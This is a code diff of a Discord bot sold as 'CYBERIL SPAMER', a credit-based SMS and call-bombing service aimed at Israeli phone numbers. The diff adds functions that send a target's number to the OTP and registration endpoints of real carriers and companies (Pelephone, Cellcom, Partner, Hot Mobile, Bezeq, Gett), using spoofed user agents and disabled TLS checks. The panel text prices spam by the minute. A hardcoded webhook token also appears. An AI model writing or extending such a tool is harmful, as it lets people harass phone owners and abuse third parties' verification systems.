@@ -1,6 +1,6 @@
 import discord
 from discord import app_commands
-from discord.ext import commands, tasks
+from discord.ext import commands
 import asyncio
 import time
 import random
@@ -14,7 +14,6 @@ import os
 from datetime import datetime, timezone, timedelta
 import certifi
 import socket
-import signal
 
 TOKEN = os.getenv("DISCORD_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
@@ -23,7 +22,6 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1486446745352146974/1gfqdmemwPDO
 
 PANEL_CHANNEL = 1481957038241353779
 GIFT_CHANNEL = 1485104425625325709
-INFO_CHANNEL = 1485125569690603692
 
 ADMIN_ROLE_ID = 1480762750052601886
 STAFF_ROLE_ID = 1480762750052601886
@@ -97,8 +95,7 @@ async def send_webhook_log(user_id: int, username: str, phone: str, cost: int, s
     
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.post(WEBHOOK_URL, json={"embeds": [embed.to_dict()]}) as resp:
-                pass
+            await session.post(WEBHOOK_URL, json={"embeds": [embed.to_dict()]})
     except:
         pass
 
@@ -386,6 +383,132 @@ async def mitmachim_request(session, phone):
     except Exception as e:
         return False, tag, str(type(e).__name__)
 
+async def pelephone_request(session, phone):
+    tag = "pelephone"
+    url = "https://www.pelephone.co.il/login/api/login/otpphone/"
+    payload = {"phone": phone, "terms": True, "appId": "DIGITALMy"}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.pelephone.co.il",
+        "Referer": "https://www.pelephone.co.il/login/?u=DIGITALMy",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except:
+        return False, tag, "Error"
+
+async def cellcom_request(session, phone):
+    tag = "cellcom"
+    url = "https://www.cellcom.co.il/api/auth/sms"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.cellcom.co.il",
+        "Referer": "https://www.cellcom.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except:
+        return False, tag, "Error"
+
+async def partner_request(session, phone):
+    tag = "partner"
+    url = "https://www.partner.co.il/api/register"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.partner.co.il",
+        "Referer": "https://www.partner.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except:
+        return False, tag, "Error"
+
+async def hot_request(session, phone):
+    tag = "hot"
+    url = "https://www.hotmobile.co.il/api/verify"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.hotmobile.co.il",
+        "Referer": "https://www.hotmobile.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except:
+        return False, tag, "Error"
+
+async def bezeq_request(session, phone):
+    tag = "bezeq"
+    url = "https://www.bezeq.co.il/api/auth"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.bezeq.co.il",
+        "Referer": "https://www.bezeq.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except:
+        return False, tag, "Error"
+
+async def gett_request(session, phone, email):
+    tag = "gett"
+    url = "https://www.gett.com/il/wp-admin/admin-ajax.php"
+    data = {
+        "action": "business_reg_action",
+        "phone": phone,
+        "first_name": "cyber",
+        "last_name": "il",
+        "work_email": email,
+        "privacy_policy": "true"
+    }
+    h = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://www.gett.com",
+        "Referer": "https://www.gett.com/il/start/?referrer=menu-button",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with session.post(url, data=data, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except:
+        return False, tag, "Error"
+
 async def run_spam_batch(phone: str):
     raw = phone
     formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
@@ -434,7 +557,6 @@ async def run_spam_batch(phone: str):
         geteat_fd.add_field("phone", raw)
         geteat_fd.add_field("testing", "false")
         
-        # כל הבקשות עם await תקין
         tasks = [
             send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
                 json_data={"agreeTou": True, "phone": formatted},
@@ -446,18 +568,12 @@ async def run_spam_batch(phone: str):
             webcut_request(s, raw),
             freeivr_request(s, raw),
             mitmachim_request(s, raw),
-            send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/",
-                json_data={"phone": raw, "terms": True, "appId": "DIGITALMy"}, tag="pelephone"),
-            send_request(s, "https://www.cellcom.co.il/api/auth/sms",
-                json_data={"phone": raw}, tag="cellcom"),
-            send_request(s, "https://www.partner.co.il/api/register",
-                json_data={"phone": raw}, tag="partner"),
-            send_request(s, "https://www.hotmobile.co.il/api/verify",
-                json_data={"phone": raw}, tag="hot"),
-            send_request(s, "https://www.bezeq.co.il/api/auth",
-                json_data={"phone": raw}, tag="bezeq"),
-            send_request(s, "https://www.gett.com/il/wp-admin/admin-ajax.php",
-                data={"action": "business_reg_action", "phone": formatted, "first_name": "cyber", "last_name": "il", "work_email": random_email, "privacy_policy": "true"}, tag="gett"),
+            pelephone_request(s, raw),
+            cellcom_request(s, raw),
+            partner_request(s, raw),
+            hot_request(s, raw),
+            bezeq_request(s, raw),
+            gett_request(s, formatted, random_email),
             send_request(s, "https://www.shufersal.co.il/api/v1/auth/otp",
                 json_data={"phone": raw}, tag="shufersal"),
             send_request(s, "https://www.rami-levy.co.il/api/auth/sms",
@@ -811,23 +927,23 @@ async def run_spam_batch(phone: str):
 
 def create_panel():
     embed = discord.Embed(
-        title="CYBERIL SPAMER",
-        description="מערכת הספאם המתקדמת בישראל",
+        title="**CYBERIL SPAMER**",
+        description="```המערכת המובילה בישראל```",
         color=COLOR_MAIN
     )
     embed.add_field(
-        name="איך מתחילים?",
-        value="1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן",
+        name="**איך מתחילים?**",
+        value="```1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן```",
         inline=False
     )
     embed.add_field(
-        name="עלות",
-        value=f"כל קרדיט = דקה אחת של ספאם",
+        name="**עלות**",
+        value=f"```כל קרדיט = דקה אחת של ספאם```",
         inline=False
     )
     embed.add_field(
-        name="הערות",
-        value=f"דיליי של {COOLDOWN_TIME} שניות בין ספאם לאותו מספר",
+        name="**הערות**",
+        value=f"```דיליי של {COOLDOWN_TIME} שניות בין ספאם לאותו מספר```",
         inline=False
     )
     embed.set_footer(text=f"CyberIL Spamer © 2026")
@@ -835,13 +951,13 @@ def create_panel():
 
 def create_gift_panel():
     embed = discord.Embed(
-        title="קרדיטים חינם",
-        description="קבל קרדיט אחד כל 24 שעות",
+        title="**קרדיטים חינם**",
+        description="```קבל קרדיט אחד כל 24 שעות```",
         color=0xFFD700
     )
     embed.add_field(
-        name="איך מקבלים?",
-        value="לחץ על הכפתור למטה",
+        name="**איך מקבלים?**",
+        value="```לחץ על הכפתור למטה```",
         inline=False
     )
     embed.set_footer(text="CyberIL Spamer © 2026")
@@ -1010,7 +1126,7 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
         
         confirm = discord.Embed(
             title="⚠️ אישור ספאם",
-            description=f"יעד: {phone_num}\nמשך: {credits_num} דקות\nעלות: {credits_num} קרדיטים\nיתרה: {bal_str}",
+            description=f"```\nיעד: {phone_num}\nמשך: {credits_num} דקות\nעלות: {credits_num} קרדיטים\nיתרה: {bal_str}\n```",
             color=COLOR_WARNING
         )
         
